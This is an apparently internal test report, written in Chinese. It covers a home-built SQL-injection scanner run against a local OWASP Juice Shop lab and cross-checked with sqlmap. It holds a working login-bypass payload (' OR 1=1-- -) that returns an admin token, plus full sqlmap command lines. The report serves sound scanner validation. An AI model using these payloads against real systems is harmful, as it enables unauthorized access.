# Juice Shop 外部裁判实跑（D109，2026-10-19）

## 环境

| 项 | 值 |
|---|---|
| 靶场 | OWASP Juice Shop **20.3.0**（官方源码构建，非本仓依赖） |
| 地址 | `http://127.0.0.1:3199` |
| 运行时 | Node **v24.18.0**，SQLite，Windows x64 |
| 真值来源（外部） | 官方 `routes/search.ts:23`、`routes/login.ts:34` 的字符串拼接（非本项目断言） |
| 外部对照 | sqlmap **1.10.7** |
| 扫描配置 | `concurrency=1 ratePerSec=0 retry=0 timeoutMs=12000 level=2 risk=2 techniques=union,boolean,error,time productionMode=false` |

## 复跑命令

```bash
# 外部裁判套件（2 真值 + 4 安全）
JUICE_BASE=http://127.0.0.1:3199 node e2e/juice-shop-lab/run.mjs

# 官方 acceptance 入口（定向）
JUICE_BASE=http://127.0.0.1:3199 node e2e/acceptance.mjs --only=juice-shop
```

## 套件结果

| 端点 | 方法 | 类型 | 结果 | 命中技术 | 请求数 |
|---|---|---|---|---|---|
| `/rest/products/search?q=apple` | GET | 真值漏洞 | ✅ 检出 | boolean | 98 |
| `/rest/user/login` | POST JSON | 真值漏洞 | ✅ 检出 | boolean | 127 |
| `/api/Feedbacks/?limit=2` | GET | 安全对照 | ✅ 0 误报 | - | 124 |
| `/api/Challenges/?name=Score%20Board` | GET | 安全对照 | ✅ 0 误报 | - | 174 |
| `/rest/user/security-question?email=x%40y.z` | GET | 安全对照 | ✅ 0 误报 | - | 124 |
| `/api/Products/?name=apple` | GET | 安全对照 | ✅ 0 误报 | - | 124 |

- 真值漏洞：**2/2 检出（漏检 0）**
- 安全端点：**0/4 误报**
- acceptance 定向：**1 PASS / 0 FAIL / 0 SKIP**（2026-10-19，`--only=juice-shop`），
  facts 为 `真值端点=搜索+登录`
- 分母防缩水：acceptance 断言现在要求 `GET /rest/products/search?q=apple` 与
  `POST /rest/user/login` 两条端点都实际出现在输出中；删掉任一条会判红，不会退回 1/1 继续绿。

## 登录点真值手工复核

官方 `routes/login.ts` 直接把 `req.body.email` 拼进 `SELECT ... FROM Users WHERE`：

| 请求 | 结果 |
|---|---|
| `{"email":"x@y.z' OR 1=1-- -","password":"x"}` | HTTP 200，返回 admin JWT（`umail=admin@juice-sh.op`） |
| `{"email":"x@y.z' OR 1=2-- -","password":"x"}` | HTTP 401，`Invalid email or password.` |

本引擎报告的 finding：`location=body`、`param=email`、`boundary='`、`technique=boolean`、
`dbms=SQLite`、`verdict=vulnerability_detected`；决定性的最后一组对照即
「401 无效凭据」vs「200 admin token」。

## sqlmap 同题对照

```bash
# 登录（401 是正常响应，需 --ignore-code=401 才能让 sqlmap 进入检测）
sqlmap -u "http://127.0.0.1:3199/rest/user/login" --method POST \
  --data '{"email":"x@y.z*","password":"x"}' --headers "Content-Type: application/json" \
  --batch --ignore-code=401 --level=2 --risk=2 --technique=BEUST --time-sec=2

# 搜索
sqlmap -u "http://127.0.0.1:3199/rest/products/search?q=apple" \
  --batch --level=2 --risk=2 --technique=BEUST --time-sec=2
```

| 端点 | sqlmap 结果 |
|---|---|
| 登录 | **SQLite boolean-based blind**（`JSON #1*`，13 列） |
| 搜索 | **SQLite boolean-based blind + time-based blind**（`q`） |

两侧在 2 个官方真值端点上结论一致；这是**同题对照**，不是检出率胜负。

## 边界（不得越界引用）

- **单轮**实跑；外部真值只有 **2 个 SQLi 端点 + 4 个安全端点**，不能外推为「通用外部检出率」。
- Juice Shop 是外部项目，仓库不 vendor；未就绪时套件按设计 SKIP，不计通过。
- 登录点报告的 `expiredMidScan=true`、401 认证挑战计数（11）是登录接口的语义噪声
  （错误凭据本来就返回 401）；本条 finding 由 `200 + admin token` vs `401` 的确定性差异确认。
- 搜索点真值来自官方 `routes/search.ts`（LIKE + 双层括号）；登录点真值来自官方
  `routes/login.ts`（JSON body）。两者都不覆盖密码重置等其余 Juice Shop SQLi 挑战点。
- 本报告对应提交前的工作区状态；运行产生的 `e2e/results/acceptance-report.partial.md`
  按 `.gitignore` 不入库，本文件保留关键事实与复跑命令。
